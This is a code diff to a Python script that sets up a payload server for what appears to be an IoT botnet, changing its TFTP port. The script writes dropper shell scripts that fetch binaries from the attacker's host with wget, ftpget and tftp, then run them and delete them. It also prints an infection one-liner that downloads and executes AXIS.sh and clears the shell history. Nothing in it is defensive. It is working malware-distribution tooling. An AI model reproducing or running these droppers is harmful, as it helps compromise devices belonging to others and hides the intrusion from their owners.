@@ -95,7 +95,7 @@ service tftp
         disable                 = no
         per_source              = 11
         cps                     = 100 2
-        flags                   = IPv4 port=33
+        flags                   = IPv4 port=25763
 }
 " > /etc/xinetd.d/tftp''')
 run("service xinetd start")
@@ -132,10 +132,10 @@ run('echo "#!/bin/bash" > /var/www/html/AXIS.sh')
 for i in compileas:
     run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + ':33/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/AXIS.sh')
     run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 25759 ' + ip + ' ' + i + ' ' + i + '; chmod 777 ' + i + ' ./' + i + '; rm -rf ' + i + '" >> /var/ftp/ftp1.sh')
-    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -p 33 ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
-    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -p 33 -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')
+    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -p 25763 ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
+    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -p 25763 -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')
 run("service xinetd restart")
 run("service apache2 restart")
 run('echo "ulimit -n 99999" >> ~/.bashrc')
 #Made By @i_am_unbekannt.
-print("Payload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + ":33/AXIS.sh; chmod 777 *; sh AXIS.sh; tftp -g " + ip + " 33 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c")
+print("Payload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + ":33/AXIS.sh; chmod 777 *; sh AXIS.sh; tftp -g " + ip + " 25763 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c")
